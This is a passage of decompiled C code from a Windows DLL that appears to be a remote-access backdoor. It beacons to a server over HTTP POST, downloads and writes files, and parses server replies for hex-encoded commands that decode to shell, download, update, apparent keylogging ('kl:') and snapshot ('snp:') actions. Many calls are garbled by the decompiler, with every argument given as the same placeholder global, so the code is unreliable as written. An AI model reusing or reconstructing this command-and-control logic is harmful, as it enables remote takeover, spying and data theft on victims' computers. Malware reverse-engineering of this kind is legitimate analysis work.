    int32_t * v103 = CreateFileW((int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x10007173
    int32_t v104 = v84 - 28; // 0x1000717e
    if (v103 != (int32_t *)-1) {
        int32_t v105 = (int32_t)v103; // 0x10007173
        *(int32_t *)(v84 - 32) = 0;
        *(int32_t *)(v84 - 36) = (int32_t)&v60;
        *(int32_t *)(v84 - 40) = v65;
        *(int32_t *)(v84 - 44) = v61;
        *(int32_t *)(v84 - 48) = v105;
        WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
        int32_t v106 = v84 - 52; // 0x10007197
        *(int32_t *)v106 = v105;
        CloseHandle(&g161);
        *(int32_t *)(v84 - 56) = v83;
        function_10005be0();
        v104 = v106;
    }
    // 0x100071e5
    *(int32_t *)(v104 - 4) = memoryHandle;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10007210 - 0x100072a5
int32_t function_10007210(int32_t a1, char * a2) {
    // 0x10007210
    int32_t v1; // 0x10007210
    int32_t v2 = v1 - 1; // 0x10007216
    int32_t result = -1; // 0x10007221
    if (v2 < 0) {
      lab_0x1000728e:
        // 0x1000728e
        return result;
    }
    int32_t v3 = (int32_t)a2;
    int32_t v4; // bp-20, 0x10007210
    int32_t v5 = &v4;
    int32_t v6; // 0x10007210
    int32_t v7; // 0x10007210
    int32_t v8; // 0x10007210
    char v9; // 0x10007250
    char v10; // 0x10007252
    int32_t v11; // 0x10007269
    int32_t v12; // 0x10007210
    int32_t v13; // 0x10007244
    int32_t v14; // 0x1000723a
    int32_t v15; // 0x1000723b
    if (*(int32_t *)0x10019064 == 0) {
        // 0x1000723f
        v13 = *(int32_t *)(4 * v2 + v12) + a1;
        v11 = 0;
        v7 = v13;
        v9 = *(char *)v7;
        v10 = *(char *)(v3 - v13 + v7);
        v8 = v5;
        while (v9 == v10) {
            // 0x10007259
            result = v2;
            if (v9 == 0) {
                return result;
            }
            // 0x1000725d
            v8 = v5;
            if (v10 == 0) {
                // break -> 0x1000727f
                break;
            }
            // 0x10007269
            v11++;
            v6 = v7 + 1;
            v8 = v5;
            if (v11 >= 200) {
                // break -> 0x1000727f
                break;
            }
            v7 = v6;
            v9 = *(char *)v7;
            v10 = *(char *)(v3 - v13 + v7);
            v8 = v5;
        }
    } else {
        // 0x1000727b
        *(int32_t *)(v5 - 4) = v3;
        v14 = v5 - 8;
        *(int32_t *)v14 = *(int32_t *)(4 * v2 + v12) + a1;
        v15 = lstrcmpA((char *)&g161, (char *)&g161);
        v8 = v14;
        if (v15 == 0) {
            // break -> 0x1000728e
            break;
        }
    }
    int32_t v16 = v2 - 1; // 0x1000727f
    result = -1;
    while (v16 >= 0) {
        // 0x10007230
        v5 = v8;
        int32_t v17 = v16;
        if (*(int32_t *)0x10019064 == 0) {
            // 0x1000723f
            v13 = *(int32_t *)(4 * v17 + v12) + a1;
            v11 = 0;
            v7 = v13;
            v9 = *(char *)v7;
            v10 = *(char *)(v3 - v13 + v7);
            v8 = v5;
            while (v9 == v10) {
                // 0x10007259
                result = v17;
                if (v9 == 0) {
                    return result;
                }
                // 0x1000725d
                v8 = v5;
                if (v10 == 0) {
                    // break -> 0x1000727f
                    break;
                }
                // 0x10007269
                v11++;
                v6 = v7 + 1;
                v8 = v5;
                if (v11 >= 200) {
                    // break -> 0x1000727f
                    break;
                }
                v7 = v6;
                v9 = *(char *)v7;
                v10 = *(char *)(v3 - v13 + v7);
                v8 = v5;
            }
        } else {
            // 0x1000727b
            *(int32_t *)(v5 - 4) = v3;
            v14 = v5 - 8;
            *(int32_t *)v14 = *(int32_t *)(4 * v17 + v12) + a1;
            v15 = lstrcmpA((char *)&g161, (char *)&g161);
            v8 = v14;
            result = v17;
            if (v15 == 0) {
                // break -> 0x1000728e
                break;
            }
        }
        // 0x1000727f
        v16 = v17 - 1;
        result = -1;
    }
    // 0x1000728e
    return result;
}

// Address range: 0x100072b0 - 0x100075e6
int32_t function_100072b0(int32_t a1, int32_t a2) {
    int32_t v1 = 0x54534f50; // bp-24, 0x100072e0
    char * buf = (char *)a2; // 0x100072eb
    __asm_rep_stosd_memset(buf, 0, 0x88b8);
    if (a1 == 0) {
        int32_t sock = function_10009460(); // 0x100072f4
        if (sock == -1) {
            // 0x10007300
            return _40___security_check_cookie_40_4();
        }
        int32_t v2 = recv(sock, buf, 0x222e0, 0); // 0x10007322
        recv(sock, (char *)(v2 + a2), 0x222e0 - v2, 0);
        closesocket(sock);
        // 0x100075d0
        return _40___security_check_cookie_40_4();
    }
    // 0x10007344
    int128_t v3; // 0x100072b0
    __asm_movdqu(v3, __asm_movdqa_9(0x7061203a657079542d746e65746e6f43));
    int128_t v4; // 0x100072b0
    __asm_movdqu(v4, __asm_movdqa_9(g36));
    int128_t v5; // 0x100072b0
    __asm_movdqu(v5, __asm_movdqa_9(0x6465646f636e656c72752d6d726f66));
    int32_t * memoryHandle = LocalAlloc((int32_t)&g161, (int32_t)&g161); // 0x100073b2
    int32_t v6 = (int32_t)memoryHandle; // bp-136, 0x100073b8
    int32_t v7; // 0x100072b0
    char * lpString = (char *)v7; // bp-220, 0x100073c9
    int32_t v8 = (int32_t)&lpString; // 0x100073c9
    *(char *)memoryHandle = 97;
    *(char *)(v6 + 1) = 112;
    *(char *)(v6 + 2) = 112;
    *(char *)(v6 + 3) = 108;
    *(char *)(v6 + 4) = 105;
    *(char *)(v6 + 5) = 99;
    *(char *)(v6 + 6) = 97;
    *(char *)(v6 + 7) = 116;
    *(char *)(v6 + 8) = 105;
    *(char *)(v6 + 9) = 111;
    *(char *)(v6 + 10) = 110;
    *(char *)(v6 + 11) = 47;
    *(char *)(v6 + 12) = 120;
    *(char *)(v6 + 13) = 45;
    *(char *)(v6 + 14) = 119;
    *(char *)(v6 + 15) = 119;
    *(char *)(v6 + 16) = 119;
    *(char *)(v6 + 17) = 45;
    *(char *)(v6 + 18) = 102;
    *(char *)(v6 + 19) = 111;
    *(char *)(v6 + 20) = 114;
    *(char *)(v6 + 21) = 109;
    *(char *)(v6 + 22) = 45;
    *(char *)(v6 + 23) = 117;
    *(char *)(v6 + 24) = 114;
    *(char *)(v6 + 25) = 108;
    *(char *)(v6 + 26) = 101;
    *(char *)(v6 + 27) = 110;
    *(char *)(v6 + 28) = 99;
    *(char *)(v6 + 29) = 111;
    *(char *)(v6 + 30) = 100;
    *(char *)(v6 + 31) = 101;
    *(char *)(v6 + 32) = 100;
    *(char *)(v6 + 33) = 0;
    int32_t v9 = v8; // 0x1000751f
    int32_t v10 = 0; // 0x1000751f
    int32_t v11 = v8; // 0x1000751f
    int32_t v12 = 0; // 0x1000751f
    if (lstrlenA(lpString) >= 1) {
        int32_t v13 = 0;
        int32_t v14 = v10 + v7;
        int32_t v15 = v13; // 0x10007525
        if (*(char *)v14 == 46) {
            // 0x10007527
            v15 = v13;
            if (*(char *)(v14 + 1) == 112) {
                // 0x1000752e
                v15 = v13;
                if (*(char *)(v14 + 2) == 104) {
                    // 0x10007535
                    v15 = v13;
                    if (*(char *)(v14 + 3) == 112) {
                        // 0x1000753c
                        *(char *)(v14 + 4) = 0;
                        v15 = v14 + 5;
                    }
                }
            }
        }
        int32_t v16 = v15;
        v9 -= 4;
        v10++;
        uint32_t v17 = lstrlenA((char *)&g161); // 0x10007548
        v11 = v9;
        v12 = v16;
        while (v10 < v17) {
            // 0x10007521
            v13 = v16;
            v14 = v10 + v7;
            v15 = v13;
            if (*(char *)v14 == 46) {
                // 0x10007527
                v15 = v13;
                if (*(char *)(v14 + 1) == 112) {
                    // 0x1000752e
                    v15 = v13;
                    if (*(char *)(v14 + 2) == 104) {
                        // 0x10007535
                        v15 = v13;
                        if (*(char *)(v14 + 3) == 112) {
                            // 0x1000753c
                            *(char *)(v14 + 4) = 0;
                            v15 = v14 + 5;
                        }
                    }
                }
            }
            // 0x10007546
            v16 = v15;
            v9 -= 4;
            v10++;
            v17 = lstrlenA((char *)&g161);
            v11 = v9;
            v12 = v16;
        }
    }
    // 0x10007552
    int32_t v18; // bp-152, 0x100072b0
    int32_t v19 = &v18; // 0x10007346
    *(int32_t *)(v11 - 4) = 0;
    *(int32_t *)(v11 - 8) = -0x7c000000;
    *(int32_t *)(v11 - 12) = (int32_t)&v6;
    *(int32_t *)(v11 - 16) = 0;
    *(int32_t *)(v11 - 20) = 0;
    int32_t v20 = &v1; // 0x10007565
    *(int32_t *)(v11 - 28) = v20;
    *(int32_t *)(v11 - 32) = v19;
    int128_t v21; // bp-128, 0x100072b0
    int32_t v22 = &v21; // 0x1000757f
    int32_t v23 = v22; // 0x10007582
    while (*(char *)v23 != 0) {
        // 0x10007585
        v23++;
    }
    // 0x1000758c
    *(int32_t *)(v11 - 36) = v12;
    *(int32_t *)(v11 - 40) = lstrlenA((char *)&g161);
    *(int32_t *)(v11 - 44) = v12;
    int32_t v24; // bp-127, 0x100072b0
    *(int32_t *)(v11 - 48) = v23 - (int32_t)&v24;
    *(int32_t *)(v11 - 52) = v22;
    *(int32_t *)(v11 - 56) = v20;
    int32_t v25; // bp-148, 0x100072b0
    *(int32_t *)(v11 - 60) = (int32_t)&v25;
    *(int32_t *)(v11 - 64) = 0x222e0;
    *(int32_t *)(v11 - 68) = a2;
    *(int32_t *)(v11 - 72) = v20;
    *(int32_t *)(v11 - 76) = v20;
    *(int32_t *)(v11 - 80) = v19;
    // 0x100075d0
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100075f0 - 0x10007727
int32_t function_100075f0(void) {
    // 0x100075f0
    __chkstk();
    int32_t v1 = 0; // bp-10012, 0x10007621
    int16_t * v2 = NULL; // bp-10028, 0x10007627
    int32_t * v3 = InternetOpenW(NULL, (int32_t)&g161, (int16_t *)&g161, (int16_t *)&g161, (int32_t)&g161); // 0x1000762d
    if (v3 == NULL) {
        // 0x1000765a
        return _40___security_check_cookie_40_4();
    }
    int32_t v4 = (int32_t)v3; // 0x1000762d
    int32_t v5 = v4; // bp-60, 0x10007648
    int32_t * v6 = InternetOpenUrlW(v3, (int16_t *)&g161, (int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (int32_t)&g161); // 0x10007649
    if (v6 == NULL) {
        // 0x10007653
        InternetCloseHandle(v3);
        // 0x1000765a
        return _40___security_check_cookie_40_4();
    }
    int32_t v7 = (int32_t)v6; // 0x10007649
    int32_t v8; // bp-10008, 0x100075f0
    int32_t v9 = &v8; // 0x10007682
    int32_t v10 = 0; // 0x1000766f
    int32_t v11 = 0;
    int32_t v12 = &v5;
    *(int32_t *)(v12 - 4) = (int32_t)&v1;
    *(int32_t *)(v12 - 8) = 0x2710;
    *(int32_t *)(v12 - 12) = v9;
    *(int32_t *)(v12 - 16) = v7;
    InternetReadFile(&g161, &g161, (int32_t)&g161, &g161);
    int32_t * v13 = (int32_t *)(v12 - 20); // 0x10007692
    *v13 = v1 + v10;
    int32_t v14 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g161); // 0x10007693
    int32_t * v15 = (int32_t *)(v12 - 24); // 0x10007698
    *v15 = v10;
    int32_t * v16 = (int32_t *)(v12 - 28); // 0x10007699
    *v16 = v11;
    int32_t * v17 = (int32_t *)(v12 - 32); // 0x100076a1
    *v17 = v14;
    function_1000c0f0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
    int32_t v18 = v12 - 36; // 0x100076a7
    int32_t * v19 = (int32_t *)v18; // 0x100076a7
    *v19 = v1;
    int32_t * v20 = (int32_t *)(v12 - 40);
    *v20 = v9;
    int32_t * v21 = (int32_t *)(v12 - 44);
    *v21 = v14 + v10;
    function_1000c0f0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
    *v13 = 0;
    *v15 = (int32_t)&v2;
    *v16 = v1;
    *v17 = v9;
    *v19 = 0;
    WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
    *v20 = v11;
    _free(&g161);
    v10 += v1;
    while (v1 != 0) {
        // 0x10007670
        v11 = v14;
        v12 = v18;
        *(int32_t *)(v12 - 4) = (int32_t)&v1;
        *(int32_t *)(v12 - 8) = 0x2710;
        *(int32_t *)(v12 - 12) = v9;
        *(int32_t *)(v12 - 16) = v7;
        InternetReadFile(&g161, &g161, (int32_t)&g161, &g161);
        v13 = (int32_t *)(v12 - 20);
        *v13 = v1 + v10;
        v14 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g161);
        v15 = (int32_t *)(v12 - 24);
        *v15 = v10;
        v16 = (int32_t *)(v12 - 28);
        *v16 = v11;
        v17 = (int32_t *)(v12 - 32);
        *v17 = v14;
        function_1000c0f0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
        v18 = v12 - 36;
        v19 = (int32_t *)v18;
        *v19 = v1;
        v20 = (int32_t *)(v12 - 40);
        *v20 = v9;
        v21 = (int32_t *)(v12 - 44);
        *v21 = v14 + v10;
        function_1000c0f0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
        *v13 = 0;
        *v15 = (int32_t)&v2;
        *v16 = v1;
        *v17 = v9;
        *v19 = 0;
        WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
        *v20 = v11;
        _free(&g161);
        v10 += v1;
    }
    // 0x10007702
    *v20 = v7;
    InternetCloseHandle((int32_t *)v14);
    *v21 = v4;
    InternetCloseHandle(&g161);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10007730 - 0x1000787f
int32_t function_10007730(int32_t a1, int32_t a2) {
    int32_t v1; // 0x10007730
    int32_t v2 = v1;
    v1 = v2 + 1;
    // 0x10007730
    while (*(char *)v2 != 0) {
        // 0x10007760
        v2 = v1;
        v1 = v2 + 1;
    }
    // 0x10007767
    int32_t v3; // bp-1008, 0x10007730
    int32_t v4; // 0x10007730
    _mbstowcs((int16_t *)&v3, (char *)v4, 1 - v4 + v2);
    int32_t v5 = function_100075f0(); // 0x10007783
    if (v5 == 0) {
        // 0x10007868
        *(int32_t *)a2 = 3;
        return _40___security_check_cookie_40_4();
    }
    char * v6 = StrStrIA((char *)v5, "{{"); // 0x1000779c
    if (v6 == NULL) {
        // 0x10007868
        *(int32_t *)a2 = 3;
        return _40___security_check_cookie_40_4();
    }
    int32_t v7 = (int32_t)v6 + 2; // 0x100077a8
    char * v8 = (char *)v7; // 0x100077b0
    int32_t v9 = (int32_t)StrStrIA(v8, "}}") - v7; // 0x100077bb
    int32_t * v10 = _malloc(v9 + 1); // 0x100077c1
    _strncpy((char *)v10, v8, v9);
    *(char *)(v9 + (int32_t)v10) = 0;
    int32_t v11 = function_10005b30(); // 0x100077de
    int32_t v12 = StrStrIA((char *)v11, "http://") == NULL ? v11 : v11 + 7;
    int32_t v13 = StrStrIA((char *)v12, "https://") == NULL ? v12 : v12 + 8;
    char v14 = *(char *)v13; // 0x10007803
    int32_t v15 = 0; // 0x1000780f
    int32_t v16; // 0x10007730
    if (v14 != 47) {
        char v17 = v14; // 0x10007815
        int32_t v18 = v13; // 0x10007815
        int32_t v19 = 0; // 0x10007815
        v15 = v19;
        while (v17 != 0) {
            // 0x1000781b
            *(char *)(v16 - v13 + v18) = v17;
            v19++;
            v18++;
            v17 = *(char *)v18;
            v15 = v19;
            if (v17 == 47) {
                // break -> 0x10007827
                break;
            }
            v15 = v19;
        }
    }
    int32_t v20 = v15 + v13; // 0x1000782d
    *(char *)(v15 + v16) = 0;
    int32_t v21 = 0; // 0x1000783b
    int32_t v22 = v20; // 0x1000783b
    *(char *)(a1 - v20 + v22) = *(char *)v20;
    v22++;
    char v23 = *(char *)v22; // 0x10007846
    v21++;
    while (v23 != 0) {
        // 0x10007840
        *(char *)(a1 - v20 + v22) = v23;
        v22++;
        v23 = *(char *)v22;
        v21++;
    }
    // 0x1000784f
    *(char *)(v21 + a1) = v23;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10007880 - 0x10008420
int32_t function_10007880(int32_t uBytes, int32_t a2, char a3, int32_t a4) {
    // 0x10007880
    int32_t v1; // bp-4, 0x10007880
    int32_t v2 = &v1; // 0x10007881
    __chkstk();
    char * v3 = (char *)0x7acd8; // bp-20, 0x100078a8
    int32_t uFlags; // 0x10007880
    int32_t * memoryHandle = LocalAlloc(uFlags, uBytes); // 0x100078c4
    int128_t v4; // 0x10007880
    __asm_movdqu(v4, __asm_movdqa_9(g40));
    int128_t v5; // 0x10007880
    __asm_movdqu(v5, __asm_movdqa_9(g33));
    int128_t v6; // 0x10007880
    __asm_movdqu(v6, __asm_movdqa_9(0x77772d782f6e6f69746163696c707061));
    int128_t v7; // 0x10007880
    __asm_movdqu(v7, __asm_movdqa_9(g53));
    int128_t v8; // 0x10007880
    __asm_movdqu(v8, __asm_movdqa_9(0x74676e654c2d746e65746e6f430a0d64));
    int32_t v9 = 0x54534f50; // bp-32, 0x1000792d
    WaitForSingleObject((int32_t *)0x54534f50, 32);
    int32_t v10; // 0x10007880
    int32_t v11 = StrStrIA((char *)v10, "http://") == NULL ? v10 : v10 + 7;
    char * v12 = (char *)v11; // 0x1000795a
    char * v13 = v12; // bp-48, 0x1000795a
    int32_t v14 = StrStrIA(v12, "https://") == NULL ? v11 : v11 + 8;
    unsigned char v15 = *(char *)v14; // 0x10007964
    int32_t v16 = v10 & -256 | (int32_t)v15; // 0x10007964
    int32_t v17 = v16; // 0x1000796a
    int32_t v18 = *(int32_t *)0x100191fc; // 0x1000796a
    int32_t v19 = 0; // 0x1000796a
    int32_t v20; // 0x10007880
    int32_t v21; // 0x10007880
    int32_t v22; // 0x10007880
    int32_t v23; // 0x10007880
    int32_t v24; // 0x10007880
    int32_t v25; // 0x10007880
    int32_t v26; // bp-1172, 0x10007880
    if (v15 < 1) {
        goto lab_0x1000799c;
    } else {
        int32_t v27 = v16; // 0x10007974
        int32_t v28 = v14; // 0x10007974
        int32_t v29 = 0; // 0x10007974
        while ((char)v27 != 47) {
            // 0x1000797b
            *(char *)((int32_t)&v26 - v14 + v28) = (char)v27;
            v29++;
            v28++;
            unsigned char v30 = *(char *)v28; // 0x1000797f
            v27 = v27 & -256 | (int32_t)v30;
            if (v29 >= (int32_t)v30) {
                // break -> 0x1000798a
                break;
            }
        }
        // 0x1000798a
        v19 = v29;
        v17 = v27;
        v18 = *(int32_t *)0x100191fc;
        v21 = v17;
        v23 = v28;
        v20 = v18;
        v25 = (int32_t)&v13;
        v24 = v19;
        v22 = v14;
        if (v19 >= 1000) {
            goto lab_0x10007e9f;
        } else {
            goto lab_0x1000799c;
        }
    }
  lab_0x1000799c:
    // 0x1000799c
    *(char *)(v2 - 1168 + v19) = 0;
    int32_t v31 = v19 + v14; // 0x100079ab
    int128_t lpString; // bp-140, 0x10007880
    int32_t lpString2 = lstrlenA((char *)&lpString); // 0x100079ad
    int32_t v32 = v31; // bp-56, 0x100079b3
    int32_t v33 = &v32; // 0x100079b3
    int32_t v34 = v17; // 0x100079c4
    int32_t v35 = v33; // 0x100079c4
    int32_t lpString1 = uBytes; // 0x100079c4
    int32_t v36; // bp-182132, 0x10007880
    if (lstrlenA((char *)lpString2) >= 1) {
        int32_t v37 = &v36; // 0x100079ca
        int32_t v38 = 0;
        int32_t v39 = v38 + v31;
        unsigned char v40 = *(char *)v39; // 0x100079e0
        int32_t v41 = v17 & -256 | (int32_t)v40; // 0x100079e0
        int32_t v42; // 0x10007a1b
        int32_t v43; // 0x10007880
        int32_t v44; // 0x10007a46
        int32_t v45; // 0x10007a60
        char * v46; // 0x10007880
        char * v47; // 0x10007880
        char * v48; // 0x10007880
        if (v40 == 46) {
            // 0x100079eb
            v46 = (char *)(v39 + 1);
            if (*v46 == 112) {
                // 0x100079f2
                v47 = (char *)(v39 + 2);
                if (*v47 == 104) {
                    // 0x100079f9
                    v48 = (char *)(v39 + 3);
                    if (*v48 == 112) {
                        // 0x10007a17
                        v42 = v2 - 0x2c770;
                        *(char *)(v38 + v42) = v40;
                        v43 = v38 + v2;
                        *(char *)(v43 - 0x2c76f) = *v46;
                        *(char *)(v43 - 0x2c76e) = *v47;
                        *(char *)(v43 - 0x2c76d) = *v48;
                        v44 = v38 + 4;
                        v21 = v41;
                        v23 = v37 - v31;
                        v20 = v18;
                        v25 = v33;
                        v24 = v44;
                        v22 = v31;
                        if (v44 >= 0x9c40) {
                            goto lab_0x10007e9f;
                        } else {
                            // 0x10007a55
                            *(char *)(v44 + v42) = 0;
                            v45 = v39 + 5;
                            v34 = v45;
                            v35 = v33;
                            lpString1 = v45;
                            goto lab_0x10007a76;
                        }
                    }
                }
            }
        }
        int32_t v49 = v33 - 4; // 0x10007a00
        *(int32_t *)v49 = v31;
        *(char *)(v38 + v37) = v40;
        int32_t v50 = v38 + 1; // 0x10007a04
        uint32_t v51 = lstrlenA((char *)&g161); // 0x10007a05
        int32_t v52 = v41; // 0x10007a0d
        v34 = v41;
        v35 = v49;
        lpString1 = uBytes;
        while (v50 < v51) {
            // 0x100079e0
            v38 = v50;
            int32_t v53 = v49;
            v39 = v38 + v31;
            v40 = *(char *)v39;
            v41 = v52 & -256 | (int32_t)v40;
            if (v40 == 46) {
                // 0x100079eb
                v46 = (char *)(v39 + 1);
                if (*v46 == 112) {
                    // 0x100079f2
                    v47 = (char *)(v39 + 2);
                    if (*v47 == 104) {
                        // 0x100079f9
                        v48 = (char *)(v39 + 3);
                        if (*v48 == 112) {
                            // 0x10007a17
                            v42 = v2 - 0x2c770;
                            *(char *)(v38 + v42) = v40;
                            v43 = v38 + v2;
                            *(char *)(v43 - 0x2c76f) = *v46;
                            *(char *)(v43 - 0x2c76e) = *v47;
                            *(char *)(v43 - 0x2c76d) = *v48;
                            v44 = v38 + 4;
                            v21 = v41;
                            v23 = v37 - v31;
                            v20 = v18;
                            v25 = v53;
                            v24 = v44;
                            v22 = v31;
                            if (v44 >= 0x9c40) {
                                goto lab_0x10007e9f;
                            } else {
                                // 0x10007a55
                                *(char *)(v44 + v42) = 0;
                                v45 = v39 + 5;
                                v34 = v45;
                                v35 = v53;
                                lpString1 = v45;
                                goto lab_0x10007a76;
                            }
                        }
                    }
                }
            }
            // 0x10007a00
            v49 = v53 - 4;
            *(int32_t *)v49 = v31;
            *(char *)(v38 + v37) = v40;
            v50 = v38 + 1;
            v51 = lstrlenA((char *)&g161);
            v52 = v41;
            v34 = v41;
            v35 = v49;
            lpString1 = uBytes;
        }
    }
    goto lab_0x10007a76;
  lab_0x10007a76:;
    int32_t v54 = (int32_t)memoryHandle; // 0x100078c4
    int32_t * v55 = (int32_t *)(v35 - 4);
    int32_t v56; // 0x10007880
    int32_t v57; // 0x10007880
    int32_t v58; // bp-142132, 0x10007880
    if (a4 != 0) {
        // 0x10007b0a
        *v55 = v34;
        *(int32_t *)(v35 - 8) = (int32_t)&v58;
        int32_t v59 = v35 - 12; // 0x10007b12
        *(int32_t *)v59 = a4;
        v56 = function_100072b0(lpString1, (int32_t)&g161);
        v57 = v59;
    } else {
        // 0x10007a81
        *v55 = (int32_t)&v9;
        *(int32_t *)(v35 - 8) = v54;
        lstrcpyA((char *)lpString1, (char *)&g161);
        *(int32_t *)(v35 - 12) = (int32_t)&v36;
        *(int32_t *)(v35 - 16) = v54;
        lstrcatA((char *)&g161, (char *)&g161);
        int128_t v60; // bp-172, 0x10007880
        *(int32_t *)(v35 - 20) = (int32_t)&v60;
        *(int32_t *)(v35 - 24) = v54;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v35 - 28) = (int32_t)&v26;
        *(int32_t *)(v35 - 32) = v54;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v35 - 36) = lpString1;
        int32_t v61 = lstrlenA((char *)&g161); // 0x10007abc
        function_10008420();
        *(int32_t *)(v35 - 40) = (int32_t)&lpString;
        *(int32_t *)(v35 - 44) = v54;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v35 - 48) = (int32_t)a3;
        *(int32_t *)(v35 - 52) = v54;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v35 - 56) = lpString1;
        *(int32_t *)(v35 - 60) = v54;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v35 - 64) = v61;
        *(int32_t *)(v35 - 68) = (int32_t)&v58;
        int32_t v62 = v35 - 72; // 0x10007afb
        *(int32_t *)v62 = 0;
        v56 = function_100072b0((int32_t)&g161, (int32_t)&g161);
        v57 = v62;
    }
    int32_t v63 = v57 + 12; // 0x10007b2b
    int32_t v64; // 0x10007880
    int32_t v65; // 0x10007880
    int32_t v66; // 0x10007880
    int32_t v67; // 0x10007880
    int32_t v68; // 0x10007880
    if (v56 == 0) {
        goto lab_0x10007e79;
    } else {
        // 0x10007b31
        *(int32_t *)(v57 + 8) = (int32_t)"&r=1";
        int32_t v69 = v57 + 4; // 0x10007b3c
        int32_t v70 = &v58; // 0x10007b3c
        *(int32_t *)v69 = v70;
        char * v71 = StrStrIA((char *)&g161, (char *)&g161); // 0x10007b3d
        v66 = v69;
        if (v71 == NULL) {
            // 0x10007b6c
            *(int32_t *)v57 = (int32_t)"404 Not Found";
            int32_t v72 = v57 - 4; // 0x10007b77
            *(int32_t *)v72 = v70;
            char * v73 = StrStrIA((char *)&g161, (char *)&g161); // 0x10007b78
            v63 = v72;
            if (v73 != NULL) {
                goto lab_0x10007e79;
            } else {
                // 0x10007b82
                v3 = (char *)0x6b6e696c;
                int32_t v74 = (int32_t)&v3; // 0x10007b8c
                *(int32_t *)(v57 - 8) = v74;
                int32_t v75 = v57 - 12; // 0x10007b99
                *(int32_t *)v75 = v70;
                char * v76 = StrStrIA(v3, (char *)58); // 0x10007b9a
                if (v76 == NULL) {
                    // 0x10007bb6
                    v3 = (char *)0x6c656873;
                    *(int32_t *)(v57 - 16) = v74;
                    int32_t v77 = v57 - 20; // 0x10007bcd
                    *(int32_t *)v77 = v70;
                    char * v78 = StrStrIA(v3, (char *)0x3a6c); // 0x10007bd2
                    if (v78 == NULL) {
                        // 0x10007bee
                        v3 = (char *)0x3a646f6d;
                        *(int32_t *)(v57 - 24) = v74;
                        int32_t v79 = v57 - 28; // 0x10007c03
                        *(int32_t *)v79 = v70;
                        char * v80 = StrStrIA(v3, NULL); // 0x10007c04
                        if (v80 == NULL) {
                            // 0x10007c20
                            v3 = (char *)0x3a647075;
                            *(int32_t *)(v57 - 32) = v74;
                            int32_t v81 = v57 - 36; // 0x10007c35
                            *(int32_t *)v81 = v70;
                            char * v82 = StrStrIA(v3, NULL); // 0x10007c36
                            if (v82 == NULL) {
                                // 0x10007c46
                                v3 = (char *)0x3a647764;
                                *(int32_t *)(v57 - 40) = v74;
                                int32_t v83 = v57 - 44; // 0x10007c5b
                                *(int32_t *)v83 = v70;
                                char * v84 = StrStrIA(v3, NULL); // 0x10007c5c
                                if (v84 == NULL) {
                                    // 0x10007c78
                                    v3 = (char *)0x3a6c6b;
                                    *(int32_t *)(v57 - 48) = v74;
                                    int32_t v85 = v57 - 52; // 0x10007c89
                                    *(int32_t *)v85 = v70;
                                    char * v86 = StrStrIA(v3, (char *)&g161); // 0x10007c8a
                                    if (v86 == NULL) {
                                        // 0x10007ca6
                                        v3 = (char *)0x3a706e73;
                                        *(int32_t *)(v57 - 56) = v74;
                                        int32_t v87 = v57 - 60; // 0x10007cbb
                                        *(int32_t *)v87 = v70;
                                        char * v88 = StrStrIA(v3, NULL); // 0x10007cbc
                                        if (v88 == NULL) {
                                            // 0x10007cd8
                                            v3 = (char *)0x72747375;
                                            *(int32_t *)(v57 - 64) = v74;
                                            int32_t v89 = v57 - 68; // 0x10007cef
                                            *(int32_t *)v89 = v70;
                                            char * v90 = StrStrIA(v3, (char *)58); // 0x10007cf0
                                            if (v90 == NULL) {
                                                // 0x10007d0c
                                                v3 = (char *)0x706f7475;
                                                *(int32_t *)(v57 - 72) = v74;
                                                int32_t v91 = v57 - 76; // 0x10007d23
                                                *(int32_t *)v91 = v70;
                                                char * v92 = StrStrIA(v3, (char *)58); // 0x10007d24
                                                if (v92 == NULL) {
                                                    // 0x10007d40
                                                    v3 = (char *)0x6c776473;
                                                    *(int32_t *)(v57 - 80) = v74;
                                                    int32_t v93 = v57 - 84; // 0x10007d57
                                                    *(int32_t *)v93 = v70;
                                                    char * v94 = StrStrIA(v3, (char *)58); // 0x10007d58
                                                    if (v94 == NULL) {
                                                        // 0x10007d71
                                                        v3 = (char *)0x646d6368;
                                                        *(int32_t *)(v57 - 88) = v74;
                                                        int32_t v95 = v57 - 92; // 0x10007d88
                                                        *(int32_t *)v95 = v70;
                                                        char * v96 = StrStrIA(v3, (char *)58); // 0x10007d89
                                                        if (v96 == NULL) {
                                                            // 0x10007da2
                                                            *(int32_t *)(v57 - 96) = (int32_t)"{{";
                                                            int32_t v97 = v57 - 100; // 0x10007dad
                                                            *(int32_t *)v97 = v70;
                                                            char * v98 = StrStrIA((char *)&g161, (char *)&g161); // 0x10007dae
                                                            v63 = v97;
                                                            if (v98 == NULL) {
                                                                goto lab_0x10007e79;
                                                            } else {
                                                                int32_t v99 = (int32_t)v98 + 2; // 0x10007dba
                                                                *(int32_t *)(v57 - 104) = (int32_t)"}}";
                                                                int32_t v100 = v57 - 108; // 0x10007dc2
                                                                *(int32_t *)v100 = v99;
                                                                *StrStrIA((char *)&g161, (char *)&g161) = 0;
                                                                v67 = v100;
                                                                v64 = v99;
                                                                goto lab_0x10007dc8;
                                                            }
                                                        } else {
                                                            // 0x10007d91
                                                            *(int32_t *)a2 = 10;
                                                            v68 = v95;
                                                            v65 = (int32_t)v96 + 4;
                                                            goto lab_0x10007dd4;
                                                        }
                                                    } else {
                                                        // 0x10007d60
                                                        *(int32_t *)a2 = 8;
                                                        v68 = v93;
